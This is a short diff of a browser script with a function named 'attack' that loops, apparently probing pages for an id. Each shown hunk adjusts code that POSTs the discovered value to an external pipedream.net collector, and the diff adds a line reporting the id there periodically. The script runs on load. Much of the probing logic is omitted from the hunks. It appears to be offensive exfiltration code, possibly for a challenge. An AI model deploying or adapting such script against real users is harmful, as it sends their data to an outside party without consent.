@@ -1,16 +1,16 @@
 <script>
-var idFound = false;
-
 function sendRequest(url) {
     let xhr = new XMLHttpRequest();
     xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
     xhr.send(url);
 }
+
+var idFound = false;
     
 async function attack() {
-    sendRequest("test=true")
     let i = 0;
     while (!idFound) {
+        if (i % 100000 == 0) sendRequest("test="+id)
         try {
             await new Promise((resolve, reject) => {
                 //fetch page
@@ -34,5 +34,4 @@ async function attack() {
     }      
 }
 attack();
-
 </script>
